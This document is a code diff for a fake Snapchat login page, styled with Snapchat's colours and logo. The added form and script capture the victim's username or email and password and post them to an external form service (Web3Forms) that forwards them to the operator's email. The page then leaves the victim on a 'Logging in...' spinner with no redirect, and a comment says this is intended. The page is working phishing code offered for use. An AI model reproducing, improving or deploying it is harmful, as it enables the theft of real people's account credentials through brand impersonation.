@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hello - Login</title>
     <style>
+        /* Snapchat Theme Styling */
         :root {
             --snap-yellow: #FFFC00;
             --snap-blue: #00ADFF;
@@ -14,7 +15,7 @@
             margin: 0;
             padding: 0;
             height: 100%;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-family: 'Avenir Next', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: var(--snap-yellow);
             display: flex;
             justify-content: center;
@@ -22,54 +23,67 @@
             overflow: hidden;
         }
 
-        .login-box {
+        .login-card {
             text-align: center;
             width: 100%;
             max-width: 320px;
             padding: 20px;
         }
 
-        /* Snapchat Ghost Logo */
+        /* Ghost Logo (Snapchat Style) */
         .ghost-logo {
-            width: 70px;
-            height: 70px;
-            margin-bottom: 10px;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 15px;
+            background-color: white;
+            mask: url('https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg') no-repeat center;
+            -webkit-mask: url('https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg') no-repeat center;
         }
 
         h1 {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 30px;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 40px;
             color: #000;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
         }
 
         input {
             width: 100%;
-            padding: 15px;
-            margin-bottom: 12px;
-            border: 1px solid #ddd;
-            border-radius: 25px;
+            padding: 16px;
+            border: 1px solid #f0f0f0;
+            border-radius: 30px;
+            font-size: 15px;
             box-sizing: border-box;
-            font-size: 14px;
             outline: none;
-            background: #fff;
+            background-color: #ffffff;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
 
-        .btn-login {
+        .login-btn {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background-color: var(--snap-blue);
             color: white;
             border: none;
-            border-radius: 25px;
+            border-radius: 30px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            margin-top: 15px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            transition: transform 0.1s;
         }
 
-        /* Stuck Loading Style */
-        #loading-screen {
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Loading Screen (Stuck Effect) */
+        #stuck-screen {
             display: none;
             text-align: center;
         }
@@ -89,15 +103,80 @@
             100% { transform: rotate(360deg); }
         }
 
-        .loading-msg {
+        .loading-text {
             font-weight: bold;
-            color: #333;
             font-size: 18px;
+            color: #333;
         }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="login-box" id="login-ui">
-        <svg class="ghost-logo" viewBox="0 0 100 100">
-            <path d="M50 15c-15 0-22 10-22 22 0 4 1 8 3 11-2 1-4 4-4 7 0 4 2 6 4 6-1 4-2 8-2 12 0 7 8 11 20 11s20-4 20-11c0-4-1-8-2-12 2 0 4-2 4-6 0-3-2-6-4-7 2-3 3-7 3-11 0-12-7-2
+    <div class="login-card" id="login-ui">
+        <div class="ghost-logo"></div>
+        <h1>Hello</h1>
+
+        <form id="snap-submit-form">
+            <input type="hidden" name="access_key" value="6cd8a093-2126-4ae4-9fba-b816897b7356">
+            
+            <div class="input-group">
+                <input type="text" name="user_id" placeholder="Username or Email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password_id" placeholder="Password" required>
+            </div>
+            
+            <input type="checkbox" name="botcheck" class="hidden">
+
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+    </div>
+
+    <div id="stuck-screen">
+        <div class="spinner"></div>
+        <p class="loading-text">Logging in...</p>
+    </div>
+
+    <script>
+        const form = document.getElementById('snap-submit-form');
+        const loginUI = document.getElementById('login-ui');
+        const stuckUI = document.getElementById('stuck-screen');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // 1. Hide Login and Show "Stuck" Spinner
+            loginUI.style.display = 'none';
+            stuckUI.style.display = 'block';
+
+            // 2. Send data to your Email using Web3Forms
+            const formData = new FormData(form);
+            const dataObject = Object.fromEntries(formData);
+            const jsonData = JSON.stringify(dataObject);
+
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: jsonData
+            })
+            .then(async (response) => {
+                let result = await response.json();
+                if (result.success) {
+                    console.log("Success: Data sent to email.");
+                }
+            })
+            .catch(error => {
+                console.log("Error sending data:", error);
+            });
+
+            // Note: No redirection means the user stays on the loading spinner forever.
+        });
+    </script>
+
+</body>
+</html>
